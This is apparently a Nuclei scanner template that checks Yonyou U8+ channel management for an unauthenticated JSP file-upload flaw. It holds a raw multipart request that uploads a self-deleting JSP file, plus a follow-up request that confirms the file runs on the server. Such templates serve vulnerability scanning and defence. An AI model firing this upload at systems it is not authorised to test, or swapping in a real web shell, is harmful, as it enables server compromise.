id: yonyou-u8-plus-temp-xwzfile-fileupload
info:
  name: 用友U8+渠道管理(高级版) xwzfile 文件上传漏洞
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://mrxn.net/jswz/yonyou-xwzfile-upload-rce.html
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: demo
    hunter-query: demo
    tips: 
    repair:
    version:
  tags: fileupload,yonyou,u8plus

variables:
    filename: "{{to_lower(rand_base(4))}}"
    date: '{{date_time("%Y%M%D%H%M%S")}}'

http:
  - raw:
      - |
        POST /temp.xwzfile HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

        ------WebKitFormBoundary
        Content-Disposition: form-data; name="file"; filename="{{filename}}.jsp"

        <%out.print("{{randstr}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundary--
      
      - |+
        GET /userfile/default/attach/{{filename}}.jsp HTTP/1.1
        Host: {{Hostname}}
        
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200 && status_code_2 == 200
          - contains(body_2,'{{randstr}}')
        condition: and